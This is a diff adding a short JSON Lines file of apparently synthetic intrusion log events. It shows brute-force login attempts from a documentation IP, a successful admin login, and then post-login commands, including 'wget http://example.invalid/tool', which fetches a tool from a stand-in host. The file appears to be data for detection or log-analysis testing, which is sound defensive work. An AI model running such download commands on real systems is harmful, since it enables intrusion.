@@ -1,0 +1,8 @@
+{"timestamp": "2026-09-14T12:40:00Z", "source_ip": "203.0.113.50", "event_type": "login_attempt", "username": "admin", "success": false, "command": null}
+{"timestamp": "2026-09-14T12:40:03Z", "source_ip": "203.0.113.50", "event_type": "login_attempt", "username": "root", "success": false, "command": null}
+{"timestamp": "2026-09-14T12:40:06Z", "source_ip": "203.0.113.50", "event_type": "login_attempt", "username": "admin", "success": true, "command": null}
+{"timestamp": "2026-09-14T12:40:10Z", "source_ip": "203.0.113.50", "event_type": "command", "username": "admin", "success": true, "command": "wget http://example.invalid/tool"}
+{"timestamp": "2026-09-14T12:40:12Z", "source_ip": "203.0.113.50", "event_type": "command", "username": "admin", "success": true, "command": "ls"}
+{"timestamp": "2026-09-14T12:40:14Z", "source_ip": "203.0.113.50", "event_type": "command", "username": "admin", "success": true, "command": "wget http://example.invalid/tool"}
+{"timestamp": "2026-09-14T12:40:16Z", "source_ip": "203.0.113.50", "event_type": "command", "username": "admin", "success": true, "command": "id"}
+{"timestamp": "2026-09-14T12:40:18Z", "source_ip": "203.0.113.50", "event_type": "login_attempt", "username": "test", "success": false, "command": null}
